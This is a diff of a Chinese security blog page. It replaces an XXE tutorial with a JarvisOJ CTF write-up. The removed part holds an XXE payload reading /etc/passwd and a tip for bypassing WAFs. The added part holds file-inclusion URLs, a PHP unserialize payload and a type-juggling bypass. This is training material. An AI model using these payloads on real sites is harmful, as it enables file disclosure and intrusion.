@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="-XXE漏洞学习及实际应用 -JarvisOj平台做题总结," />
+  <meta name="keywords" content="渗透练习," />
 
 
 
@@ -79,24 +79,25 @@
 
 
 
-<meta name="description" content="XXE漏洞基础学习当WEB服务使用XML或者JSON中的一种进行传输时，服务器可能会接收开发人员并未预料到的数据格式。如果服务器上的XML解析器的配置不完善，在JSON传输的终端可能会遭受XXE攻击，也就是俗称的XML外部实体攻击。 XXE是一种针对XML终端实施的攻击，黑客想要实施这种攻击，需要在XML的payload包含外部实体声明，且服务器本身允许实体扩展。这样的话，黑客或许能读取WEB服务">
-<meta name="keywords" content="-XXE漏洞学习及实际应用 -JarvisOj平台做题总结">
+<meta name="description" content="[JarvisOj]神盾局的秘密 IN A Mess    [JarvisOj]神盾局的秘密题目链接:http://web.jarvisoj.com:32768/考察代码审计和文件包含漏洞= = http://web.jarvisoj.com:32768/查看源代码 点击进入之后一看长成这样还以为是data伪协议对图片进行base64编码，传了半天事实证明我又想多了= = view-sourc">
+<meta name="keywords" content="渗透练习">
 <meta property="og:type" content="article">
-<meta property="og:title" content="XXE漏洞学习及利用">
-<meta property="og:url" content="http://grassgrass.top/2017/12/14/XXE漏洞学习及实际应用/index.html">
+<meta property="og:title" content="JarvisOj平台做题总结(1)">
+<meta property="og:url" content="http://grassgrass.top/2018/07/21/JarvisOj平台做题总结-1/index.html">
 <meta property="og:site_name" content="Grassgrass&#39;s Blog">
-<meta property="og:description" content="XXE漏洞基础学习当WEB服务使用XML或者JSON中的一种进行传输时，服务器可能会接收开发人员并未预料到的数据格式。如果服务器上的XML解析器的配置不完善，在JSON传输的终端可能会遭受XXE攻击，也就是俗称的XML外部实体攻击。 XXE是一种针对XML终端实施的攻击，黑客想要实施这种攻击，需要在XML的payload包含外部实体声明，且服务器本身允许实体扩展。这样的话，黑客或许能读取WEB服务">
-<meta property="og:image" content="http://grassgrass.top/2017/12/14/XXE漏洞学习及实际应用/在违法的边缘试探.jpg">
-<meta property="og:image" content="http://grassgrass.top/2017/12/14/XXE漏洞学习及实际应用/题目简介.jpg">
-<meta property="og:image" content="http://grassgrass.top/2017/12/14/XXE漏洞学习及实际应用/题目简介1.jpg">
-<meta property="og:image" content="http://grassgrass.top/2017/12/14/XXE漏洞学习及实际应用/图片1.jpg">
-<meta property="og:image" content="http://grassgrass.top/2017/12/14/XXE漏洞学习及实际应用/图片2.jpg">
-<meta property="og:image" content="http://grassgrass.top/2017/12/14/XXE漏洞学习及实际应用/图片3.jpg">
-<meta property="og:updated_time" content="2018-02-26T06:07:17.933Z">
+<meta property="og:description" content="[JarvisOj]神盾局的秘密 IN A Mess    [JarvisOj]神盾局的秘密题目链接:http://web.jarvisoj.com:32768/考察代码审计和文件包含漏洞= = http://web.jarvisoj.com:32768/查看源代码 点击进入之后一看长成这样还以为是data伪协议对图片进行base64编码，传了半天事实证明我又想多了= = view-sourc">
+<meta property="og:image" content="http://grassgrass.top/2018/07/21/JarvisOj平台做题总结-1/图片1.jpg">
+<meta property="og:image" content="http://grassgrass.top/2018/07/21/JarvisOj平台做题总结-1/图片2.jpg">
+<meta property="og:image" content="http://grassgrass.top/2018/07/21/JarvisOj平台做题总结-1/图片3.jpg">
+<meta property="og:image" content="http://grassgrass.top/2018/07/21/JarvisOj平台做题总结-1/图片4.jpg">
+<meta property="og:image" content="http://grassgrass.top/2018/07/21/JarvisOj平台做题总结-1/图片5.jpg">
+<meta property="og:image" content="http://grassgrass.top/2018/07/21/JarvisOj平台做题总结-1/图片6.jpg">
+<meta property="og:image" content="http://grassgrass.top/2018/07/21/JarvisOj平台做题总结-1/图片7.jpg">
+<meta property="og:updated_time" content="2018-08-25T12:39:43.301Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="XXE漏洞学习及利用">
-<meta name="twitter:description" content="XXE漏洞基础学习当WEB服务使用XML或者JSON中的一种进行传输时，服务器可能会接收开发人员并未预料到的数据格式。如果服务器上的XML解析器的配置不完善，在JSON传输的终端可能会遭受XXE攻击，也就是俗称的XML外部实体攻击。 XXE是一种针对XML终端实施的攻击，黑客想要实施这种攻击，需要在XML的payload包含外部实体声明，且服务器本身允许实体扩展。这样的话，黑客或许能读取WEB服务">
-<meta name="twitter:image" content="http://grassgrass.top/2017/12/14/XXE漏洞学习及实际应用/在违法的边缘试探.jpg">
+<meta name="twitter:title" content="JarvisOj平台做题总结(1)">
+<meta name="twitter:description" content="[JarvisOj]神盾局的秘密 IN A Mess    [JarvisOj]神盾局的秘密题目链接:http://web.jarvisoj.com:32768/考察代码审计和文件包含漏洞= = http://web.jarvisoj.com:32768/查看源代码 点击进入之后一看长成这样还以为是data伪协议对图片进行base64编码，传了半天事实证明我又想多了= = view-sourc">
+<meta name="twitter:image" content="http://grassgrass.top/2018/07/21/JarvisOj平台做题总结-1/图片1.jpg">
 
 
 
@@ -126,13 +127,13 @@
 
 
 
-  <link rel="canonical" href="http://grassgrass.top/2017/12/14/XXE漏洞学习及实际应用/"/>
+  <link rel="canonical" href="http://grassgrass.top/2018/07/21/JarvisOj平台做题总结-1/"/>
 
 
 
 
 
-  <title>XXE漏洞学习及利用 | Grassgrass's Blog</title>
+  <title>JarvisOj平台做题总结(1) | Grassgrass's Blog</title>
   
 
 
@@ -270,7 +271,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://grassgrass.top/2017/12/14/XXE漏洞学习及实际应用/">
+    <link itemprop="mainEntityOfPage" href="http://grassgrass.top/2018/07/21/JarvisOj平台做题总结-1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Grassgrass">
@@ -287,7 +288,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">XXE漏洞学习及利用</h1>
+          <h1 class="post-title" itemprop="name headline">JarvisOj平台做题总结(1)</h1>
         
 
         <div class="post-meta">
@@ -299,8 +300,8 @@
               
                 <span class="post-meta-item-text">Veröffentlicht am</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-12-14T10:43:51+08:00">
-                2017-12-14
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-07-21T19:37:11+08:00">
+                2018-07-21
               </time>
             
 
@@ -322,8 +323,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/XXE/" itemprop="url" rel="index">
-                    <span itemprop="name">XXE</span>
+                  <a href="/categories/渗透练习/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透练习</span>
                   </a>
                 </span>
 
@@ -359,29 +360,27 @@
       
 
       
-        <h2 id="XXE漏洞基础学习"><a href="#XXE漏洞基础学习" class="headerlink" title="XXE漏洞基础学习"></a>XXE漏洞基础学习</h2><p>当WEB服务使用XML或者JSON中的一种进行传输时，服务器可能会接收开发人员并未预料到的数据格式。如果服务器上的XML解析器的配置不完善，在JSON传输的终端可能会遭受XXE攻击，也就是俗称的XML外部实体攻击。</p>
-<p>XXE是一种针对XML终端实施的攻击，黑客想要实施这种攻击，需要在XML的payload包含外部实体声明，且服务器本身允许实体扩展。这样的话，黑客或许能读取WEB服务器的文件系统，通过UNC路径访问远程文件系统，或者通过HTTP/HTTPS连接到任意主机。</p>
-<p>所以学习XXE漏洞之前有必要先学习一波xml的文档格式，</p>
-<p>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p>
-<p>XML文件结构和基本语法 - CSDN博客:<br><a href="http://blog.csdn.net/jfkidear/article/details/6820642" target="_blank" rel="noopener">http://blog.csdn.net/jfkidear/article/details/6820642</a><br>未知攻焉知防——XXE漏洞攻防 - 腾讯安全应急响应中心:<br><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/69</a></p>
-<hr>
-<p><img src="/2017/12/14/XXE漏洞学习及实际应用/在违法的边缘试探.jpg" alt=""><br>在了解以上的知识之后就可以着手开始搞事情了，初级应用大概是用burp抓包，然后post一段xml格式的数据，<br>获取POST数据，是利用getParsedBody方法，而这个方法对POST的处理，是按照content-type来区分和解析的<br>有时候框架会帮开发者一些他可能并不需要的『忙』，</p>
-<p>比如slimphp这里，<strong>常规的POST的content-type为application/x-www-form-urlencoded，但只要我将其修改为application/json，我就可以传入json格式的POST数据，修改为application/xml，我就可以传入XML格式的数据。</strong><br>这个特性将会导致两个问题：</p>
-<blockquote>
+        <blockquote>
 <ul>
-<li>WAF绕过</li>
-<li>可能存在的XXE漏洞</li>
+<li>[JarvisOj]神盾局的秘密</li>
+<li>IN A Mess </li>
 </ul>
 </blockquote>
-<p>WAF绕过这个肯定不用说了，常规的WAF一般只检测application/x-www-form-urlencoded的数据，一旦修改数据类型则将通杀各大WAF。<br>本菜鸟先研究一下XXE漏洞</p>
-<p><strong>将数据post过去时一定要记住将post去的数据改为xml格式</strong></p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">search</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">search</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<hr>
-<h2 id="XXE漏洞实例"><a href="#XXE漏洞实例" class="headerlink" title="XXE漏洞实例"></a>XXE漏洞实例</h2><p>api调用<br>题目链接： <a href="http://web.jarvisoj.com:9882/" target="_blank" rel="noopener">http://web.jarvisoj.com:9882/</a><br><img src="/2017/12/14/XXE漏洞学习及实际应用/题目简介.jpg" alt=""><br>点击进入后题目大概长这样= =<br><img src="/2017/12/14/XXE漏洞学习及实际应用/题目简介1.jpg" alt=""><br>在窗口输入数据会根据输入数据有不同的回显。<br>回显为输入数据+own（技术不行，回头考完试有时间把这个源代码爬下来orz）</p>
-<p>用burpsuite抓包<br><img src="/2017/12/14/XXE漏洞学习及实际应用/图片1.jpg" alt=""> </p>
-<p>按上面的方法常规post一段xml格式数据过去，得到一串文件目录信息<br><img src="/2017/12/14/XXE漏洞学习及实际应用/图片2.jpg" alt=""></p>
-<p>按照题目信息提示，post的xml系统文件应改为/home/ctf/flag.txt<br><img src="/2017/12/14/XXE漏洞学习及实际应用/图片3.jpg" alt=""></p>
-<p>可以得到最后的flag为CTF{XxE_15_n0T_S7range_Enough}</p>
+<h2 id="JarvisOj-神盾局的秘密"><a href="#JarvisOj-神盾局的秘密" class="headerlink" title="[JarvisOj]神盾局的秘密"></a>[JarvisOj]神盾局的秘密</h2><p>题目链接:<a href="http://web.jarvisoj.com:32768/" target="_blank" rel="noopener">http://web.jarvisoj.com:32768/</a><br><strong>考察代码审计和文件包含漏洞= =</strong></p>
+<p><a href="http://web.jarvisoj.com:32768/查看源代码" target="_blank" rel="noopener">http://web.jarvisoj.com:32768/查看源代码</a></p>
+<p>点击进入之后一看长成这样还以为是data伪协议对图片进行base64编码，传了半天事实证明我又想多了= =<br><img src="/2018/07/21/JarvisOj平台做题总结-1/图片1.jpg" alt=""></p>
+<p>view-source:<a href="http://web.jarvisoj.com:32768/showimg.php?img=c2hpZWxkLmpwZw==" target="_blank" rel="noopener">http://web.jarvisoj.com:32768/showimg.php?img=c2hpZWxkLmpwZw==</a></p>
+<p>c2hpZWxkLmpwZw==解码是shield.jpg，文件包含漏洞将文件名进行base64编码传递进去，会打印出文件内容。<br><img src="/2018/07/21/JarvisOj平台做题总结-1/图片2.jpg" alt=""></p>
+<p>view-source:<a href="http://web.jarvisoj.com:32768/showimg.php?img=c2hvd2ltZy5waHA=" target="_blank" rel="noopener">http://web.jarvisoj.com:32768/showimg.php?img=c2hvd2ltZy5waHA=</a><br>利用这个漏洞将showing.php打印出来<br><img src="/2018/07/21/JarvisOj平台做题总结-1/图片3.jpg" alt=""></p>
+<p>view-source:<a href="http://web.jarvisoj.com:32768/showimg.php?img=aW5kZXgucGhw" target="_blank" rel="noopener">http://web.jarvisoj.com:32768/showimg.php?img=aW5kZXgucGhw</a><br>打印index.php<br><img src="/2018/07/21/JarvisOj平台做题总结-1/图片4.jpg" alt=""></p>
+<p>利用同样的漏洞，<br>view-source:<a href="http://web.jarvisoj.com:32768/showimg.php?img=c2hpZWxkLnBocA==" target="_blank" rel="noopener">http://web.jarvisoj.com:32768/showimg.php?img=c2hpZWxkLnBocA==</a><br>读取shield.php文件<br><img src="/2018/07/21/JarvisOj平台做题总结-1/图片5.jpg" alt=""></p>
+<p>Flag在pctf里面，还是和之前一样的方法，然鹅 File not found!<br>观察发现showimg.php 对”pctf” 做了过滤，还好在index.php中用class变量unserialize可以传入一个字符串反序列化的东西。</p>
+<p>O:6:”Shield”:1:{s:4:”file”;s:8:”pctf.php”;}<br>Payload:view-source:<a href="http://web.jarvisoj.com:32768/index.php?class=O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}" target="_blank" rel="noopener">http://web.jarvisoj.com:32768/index.php?class=O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</a><br><img src="/2018/07/21/JarvisOj平台做题总结-1/图片6.jpg" alt=""></p>
+<p>最后得到flag: PCTF{I_4m_not_fl4g}</p>
+<h2 id="IN-A-Mess"><a href="#IN-A-Mess" class="headerlink" title="IN A Mess"></a>IN A Mess</h2><p>题目链接:<a href="http://web.jarvisoj.com:32780" target="_blank" rel="noopener">http://web.jarvisoj.com:32780</a><br>查看源码<br>提示index.phps<br><img src="/2018/07/21/JarvisOj平台做题总结-1/图片7.jpg" alt=""></p>
+<p> <a href="http://web.jarvisoj.com:32780/index.php?a=data:,1112" target="_blank" rel="noopener">http://web.jarvisoj.com:32780/index.php?a=data:,1112</a> is a nice lab! &amp;b=%00412311&amp;id=0e123</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'id'</span>]) </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hahahaha"</span>; </span><br><span class="line">&#125; </span><br><span class="line">$id=$_GET[<span class="string">'id'</span>]; </span><br><span class="line">$a=$_GET[<span class="string">'a'</span>]; </span><br><span class="line">$b=$_GET[<span class="string">'b'</span>]; </span><br><span class="line"><span class="keyword">if</span>(stripos($a,<span class="string">'.'</span>)) </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'23333'</span>; </span><br><span class="line">    <span class="keyword">return</span> ; </span><br><span class="line">&#125; </span><br><span class="line">$data = @file_get_contents($a,<span class="string">'r'</span>); </span><br><span class="line"><span class="keyword">if</span>($data==<span class="string">"I want to join D0g3"</span> <span class="keyword">and</span> $id==<span class="number">0</span> <span class="keyword">and</span> strlen($b)&gt;<span class="number">5</span> <span class="keyword">and</span> strlen($b)&lt;<span class="number">7</span> <span class="keyword">and</span> eregi($b,<span class="string">"1114"</span>) <span class="keyword">and</span> substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>) </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$f1ag"</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"work harder!harder!harder!"</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="参考知识点"><a href="#参考知识点" class="headerlink" title="参考知识点"></a>参考知识点</h2><p><strong>php isset()与empty()的使用的区别</strong><br><a href="http://www.jb51.net/article/24666.htm" target="_blank" rel="noopener">http://www.jb51.net/article/24666.htm</a><br><strong>unserialize和serialize函数</strong><br><a href="http://www.jb51.net/article/112638.htm" target="_blank" rel="noopener">http://www.jb51.net/article/112638.htm</a><br><strong>data类型的Url格式：把小数据直接嵌入到Url中 - CSDN博客</strong><br><a href="http://blog.csdn.net/lxgwm2008/article/details/38437875" target="_blank" rel="noopener">http://blog.csdn.net/lxgwm2008/article/details/38437875</a></p>
 
       
     </div>
@@ -399,7 +398,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/XXE漏洞学习及实际应用-JarvisOj平台做题总结/" rel="tag"># -XXE漏洞学习及实际应用 -JarvisOj平台做题总结</a>
+            <a href="/tags/渗透练习/" rel="tag"># 渗透练习</a>
           
         </div>
       
@@ -412,8 +411,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/10/07/咸鱼开始补习数据结构/" rel="next" title="咸鱼开始补习数据结构">
-                <i class="fa fa-chevron-left"></i> 咸鱼开始补习数据结构
+              <a href="/2018/02/11/机器学习-安装sklearn出现的小问题/" rel="next" title="机器学习-安装sklearn出现的小问题">
+                <i class="fa fa-chevron-left"></i> 机器学习-安装sklearn出现的小问题
               </a>
             
           </div>
@@ -422,8 +421,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2017/12/21/JarvisOj平台做题总结-1/" rel="prev" title="JarvisOj平台做题总结(1)">
-                JarvisOj平台做题总结(1) <i class="fa fa-chevron-right"></i>
+              <a href="/2018/07/28/JarvisOj平台做题总结-2/" rel="prev" title="JarvisOj平台做题总结-2">
+                JarvisOj平台做题总结-2 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -580,7 +579,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#XXE漏洞基础学习"><span class="nav-number">1.</span> <span class="nav-text">XXE漏洞基础学习</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XXE漏洞实例"><span class="nav-number">2.</span> <span class="nav-text">XXE漏洞实例</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#JarvisOj-神盾局的秘密"><span class="nav-number">1.</span> <span class="nav-text">[JarvisOj]神盾局的秘密</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IN-A-Mess"><span class="nav-number">2.</span> <span class="nav-text">IN A Mess</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考知识点"><span class="nav-number">3.</span> <span class="nav-text">参考知识点</span></a></li></ol></div>
             
 
           </div>
